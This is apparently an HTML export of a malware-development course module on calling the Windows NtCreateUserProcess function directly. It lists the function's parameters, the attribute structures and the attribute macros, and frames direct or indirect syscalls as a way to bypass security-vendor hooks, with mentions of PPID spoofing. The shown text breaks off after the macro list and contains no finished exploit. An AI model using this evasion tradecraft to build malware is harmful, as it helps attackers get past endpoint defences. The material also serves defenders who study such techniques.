<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>91. Diving Into NtCreateUserProcess</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="9128d84d-1c2f-4993-9aef-fccbc228565b" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/91"><strong>91. Diving Into NtCreateUserProcess</strong></a></h1></header><div class="page-body"><h2 id="03c3f7cf-768d-48cf-80a9-2e457f1927a1" class=""><strong>Diving Into NtCreateUserProcess</strong></h2><h3 id="bc2177a2-c15b-4ba5-8670-4246d12c7618" class=""><strong>Introduction</strong></h3><p id="014d6fdd-c81b-4793-a582-7a7c08471f4c" class="">Up to this point in the course, the <code>CreateProcess</code> WinAPI has been utilized for the creation of new processes. Nevertheless, it is worth noting that the <code>CreateProcess</code> function ultimately invokes <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2288">NtCreateUserProcess</a> after executing several internal functions, which may be hooked by security vendors. Thus, given the possibility of calling a hooked NtCreateUserProcess through <code>CreateProcess</code>, it becomes obligatory for us to invoke it directly via direct or indirect syscalls as a means of bypassing the potential hook installed.</p><p id="2475be34-5b37-42d4-9949-42a13468fc22" class="">The following is an image from the <a href="https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals">Windows Internals 7th edition - Part 1</a> book, which shows <code>CreateProcess</code>&#x27;s execution flow. Note that functions marked with dotted boxes are internal functions.</p><figure id="52ea5ae6-de97-4d06-a042-0310192d6c3a" class="image"><a href="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-119551140-8b599665-05e6-44b7-829c-fc1d43d6437d.jpg"><img style="width:1300px" src="91%20Diving%20Into%20NtCreateUserProcess%209128d84d1c2f49939aeffccbc228565b/ntcreateuserprocess-119551140-8b599665-05e6-44b7-829c-fc1d43d6437d.jpg"/></a></figure><p id="d8b5f6e0-92e3-465d-96da-73f52f228c02" class=""><code>NtCreateUserProcess</code> is the final user-mode accessible function and represents the lowest level <code>CreateProcess</code> can reach before the kernel mode.</p><h3 id="baa4800f-967b-4753-b300-4bb1961b7f3c" class=""><strong>NtCreateUserProcess Parameters</strong></h3><p id="f224ca0e-7a70-4150-8543-2f768a730251" class="">The <code>NtCreateUserProcess</code> function is a highly customizable function that has multiple parameters and performs complex operations.</p><pre id="7b2a5490-5880-4691-8f1c-f1b6b80f16f8" class="code code-wrap"><code>NTSTATUS NTAPI NtCreateUserProcess(
    OUT         PHANDLE ProcessHandle,
    OUT         PHANDLE ThreadHandle,
    IN          ACCESS_MASK ProcessDesiredAccess,
    IN          ACCESS_MASK ThreadDesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ProcessObjectAttributes,
    IN OPTIONAL POBJECT_ATTRIBUTES ThreadObjectAttributes,
    IN ULONG    ProcessFlags,                                    // PROCESS_CREATE_FLAGS_*
    IN ULONG    ThreadFlags,                                     // THREAD_CREATE_FLAGS_*
    IN OPTIONAL PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    IN OUT      PPS_CREATE_INFO CreateInfo,
    IN          PPS_ATTRIBUTE_LIST AttributeList
);
</code></pre><ul id="5979996e-0a9d-4d09-b97d-740b8b418b07" class="bulleted-list"><li style="list-style-type:disc"><code>ProcessHandle</code> - A pointer to a <code>HANDLE</code> variable that receives the handle of the newly created process.</li></ul><ul id="4c8c9b37-c354-4859-8f93-0158f8b7eb82" class="bulleted-list"><li style="list-style-type:disc"><code>ThreadHandle</code> - A pointer to a <code>HANDLE</code> variable that receives the handle to the main thread of the newly created process.</li></ul><ul id="6da828a4-4fcd-47a1-8c18-7af5c75f9b00" class="bulleted-list"><li style="list-style-type:disc"><code>ProcessDesiredAccess</code> - Determines the granted access to the process handle and is of type <code>ACCESS_MASK</code>. This module will use <code>PROCESS_ALL_ACCESS</code> to grant full access rights to the object.</li></ul><ul id="a5670418-ea90-4626-b0c3-619e517ee65f" class="bulleted-list"><li style="list-style-type:disc"><code>ThreadDesiredAccess</code> - Determines the granted access to the thread handle and is of type <code>ACCESS_MASK</code>. This module will use <code>THREAD_ALL_ACCESS</code> to grant full access rights to the object.</li></ul><ul id="6939b8de-a746-4df7-a835-15925a1393fc" class="bulleted-list"><li style="list-style-type:disc"><code>ProcessObjectAttributes</code> - This parameter specifies the attributes that can be applied to the process. The attributes are defined using the <code>OBJECT_ATTRIBUTES</code> structure and are typically initialized using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes">InitializeObjectAttributes</a> macro. For this module, this parameter will be set to <code>NULL</code>.</li></ul><ul id="0669997c-6666-4461-9954-98de24ced349" class="bulleted-list"><li style="list-style-type:disc"><code>ThreadObjectAttributes</code> - This parameter specifies the attributes that can be applied to the thread. The attributes are defined using the <code>OBJECT_ATTRIBUTES</code> structure and are typically initialized using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes">InitializeObjectAttributes</a> macro. For this module, this parameter will be set to <code>NULL</code>.</li></ul><ul id="6e8d11c5-d66f-4806-b7b0-b9afa5a7800e" class="bulleted-list"><li style="list-style-type:disc"><code>ProcessFlags</code> - This is the flag that determines the initial state of the created process. For example, the process could be created in a suspended state or could inherit from its parent process. In this module, this flag will be set to <code>NULL</code> to indicate that the process should be created in a normal state.</li></ul><ul id="53528045-a12d-41a5-ad41-588f72d4652a" class="bulleted-list"><li style="list-style-type:disc"><code>ThreadFlags</code> - This is the flag that determines the initial state of the main thread. In this module, this flag will be set to <code>NULL</code> to indicate that the thread should be created in a normal state.</li></ul><ul id="5db19712-066a-4e21-9013-63aa1408b7a5" class="bulleted-list"><li style="list-style-type:disc"><code>ProcessParameters</code> - An optional parameter, that points to an <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2635">RTL_USER_PROCESS_PARAMETERS</a> structure. This parameter describes the process&#x27;s initial arguments.</li></ul><ul id="fd999a2e-70b9-4a76-a0ad-4fa95f8076e5" class="bulleted-list"><li style="list-style-type:disc"><code>CreateInfo</code> - This is a pointer to a <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2207">PS_CREATE_INFO</a> structure that will hold returned information about the created process when the function succeeds.</li></ul><ul id="9749580c-2432-4237-b996-b4df3ba92277" class="bulleted-list"><li style="list-style-type:disc"><code>AttributeList</code> - This is a pointer to a <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2060">PS_ATTRIBUTE_LIST</a> structure. The purpose of this parameter is to set up the attributes of the created process and thread. Recall that these are the same attributes that allow PPID spoofing and block DLL policy.</li></ul><p id="9983cd71-be5e-45f5-8c48-1f1a924e8ebc" class="">Note that the process name to be created is passed as an attribute using the <code>AttributeList</code> parameter.</p><h3 id="7824aa27-f22a-40a6-b5c7-b47f1321b211" class=""><strong>PS_ATTRIBUTE_LIST AttributeList</strong></h3><p id="bea75b31-52cf-433b-b0c7-37c73d40afb0" class="">As mentioned above, <code>NtCreateUserProcess</code>&#x27;s last parameter is a pointer to a <code>PS_ATTRIBUTE_LIST</code> structure.</p><pre id="732e0dac-5d70-4aff-9623-d5ac6e435bec" class="code code-wrap"><code>typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[1];

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
</code></pre><ul id="d4fa1120-a9e4-4314-b3b1-f9286e8cdfd9" class="bulleted-list"><li style="list-style-type:disc"><code>TotalLength</code> - This is always set to the size of the <code>PS_ATTRIBUTE_LIST</code> structure.</li></ul><ul id="532482ec-ad04-4b43-be2b-7759ba6dd1b1" class="bulleted-list"><li style="list-style-type:disc"><code>Attributes</code> - An array of <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2048">PS_ATTRIBUTE</a> structure.</li></ul><h3 id="d0d47543-eab1-4d3e-80ce-1c088b4030b2" class=""><strong>PS_ATTRIBUTE Attributes</strong></h3><pre id="a88b7b0d-3cc4-439a-b81d-fe148b380c10" class="code code-wrap"><code>typedef struct _PS_ATTRIBUTE
{
	ULONG_PTR Attribute;
	SIZE_T Size;
	union
	{
		ULONG_PTR Value;
		PVOID ValuePtr;
	};
	PSIZE_T ReturnLength;

} PS_ATTRIBUTE, * PPS_ATTRIBUTE;
</code></pre><p id="b92f3ced-440f-4d80-9bbc-b897594206bc" class="">The following elements should be initialized for every attribute added to the process:</p><ul id="f83d8eb5-e55d-4ceb-8008-64e75083b7e9" class="bulleted-list"><li style="list-style-type:disc"><code>Attribute</code> - Set to the type of attribute.</li></ul><ul id="5d0c0e6f-8acf-4ee0-b73a-bdd18cd52cb0" class="bulleted-list"><li style="list-style-type:disc"><code>Value</code> - The attribute value.</li></ul><ul id="a906938f-11e1-40ff-8b69-d8164420ceb6" class="bulleted-list"><li style="list-style-type:disc"><code>Size</code>: The size of the attribute value (size of <code>Value</code>).</li></ul><p id="b7170178-26bd-4d3d-ad87-5df90e110865" class="">The parameters are similar to those used in the <code>UpdateProcThreadAttribute</code> WinAPI function. The main difference is the <code>Attribute</code> member must use one of the values that are specific to the <code>NtCreateUserProcess</code> function. These values are shown below.</p><pre id="7e80660a-62a0-4bc8-a86a-e2a40987e39f" class="code code-wrap"><code>// Specifies the parent process of the new process
#define PS_ATTRIBUTE_PARENT_PROCESS \
    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)// Specifies the debug port to use
#define PS_ATTRIBUTE_DEBUG_PORT \
    PsAttributeValue(PsAttributeDebugPort, FALSE, TRUE, TRUE)// Specifies the token to assign to the new process
#define PS_ATTRIBUTE_TOKEN \
    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)// Specifies the client ID to assign to the new process
#define PS_ATTRIBUTE_CLIENT_ID \
    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)// Specifies the TEB address to use for the new process
#define PS_ATTRIBUTE_TEB_ADDRESS \
    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)// Specifies the image name of the new process
#define PS_ATTRIBUTE_IMAGE_NAME \
    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)// Specifies the image information of the new process
#define PS_ATTRIBUTE_IMAGE_INFO \
    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)// Specifies the amount of memory to reserve for the new process
#define PS_ATTRIBUTE_MEMORY_RESERVE \
    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)// Specifies the priority class to use for the new process
#define PS_ATTRIBUTE_PRIORITY_CLASS \
    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)// Specifies the error mode to use for the new process
#define PS_ATTRIBUTE_ERROR_MODE \
    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)// Specifies the standard handle information to use for the new process
#define PS_ATTRIBUTE_STD_HANDLE_INFO \
    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)// Specifies the handle list to use for the new process
#define PS_ATTRIBUTE_HANDLE_LIST \
    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)// Specifies the group affinity to use for the new process
#define PS_ATTRIBUTE_GROUP_AFFINITY \
    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)// Specifies the preferred NUMA node to use for the new process
#define PS_ATTRIBUTE_PREFERRED_NODE \
    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)// Specifies the ideal processor to use for the new process
#define PS_ATTRIBUTE_IDEAL_PROCESSOR \
    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)// Specifies the process mitigation options to use for the new process
#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, FALSE)// Specifies the protection level to use for the new process
#define PS_ATTRIBUTE_PROTECTION_LEVEL \
    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, FALSE)// Specifies the UMS thread to associate with the new process
#define PS_ATTRIBUTE_UMS_THREAD \
    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)// Specifies whether the new process is a secure process
#define PS_ATTRIBUTE_SECURE_PROCESS \
    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)// Specifies the job list to associate with the new process
#define PS_ATTRIBUTE_JOB_LIST \
    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)// Specifies the child process policy to use for the new process
#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \
    PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)// Specifies the all application packages policy to use for the new process
#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \
    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)

// Specifies the child process should have access to the Win32k subsystem.
#define PS_ATTRIBUTE_WIN32K_FILTER	\
    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)// Specifies the child process is allowed to claim a specific origin when making a safe file open prompt
#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM	\
    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)// Specifies the child process is isolated using the BNO framework
#define PS_ATTRIBUTE_BNO_ISOLATION	\
    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)

// Specifies that the child&#x27;s process desktop application policy
#define PS_ATTRIBUTE_DESKTOP_APP_POLICY	\
    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)

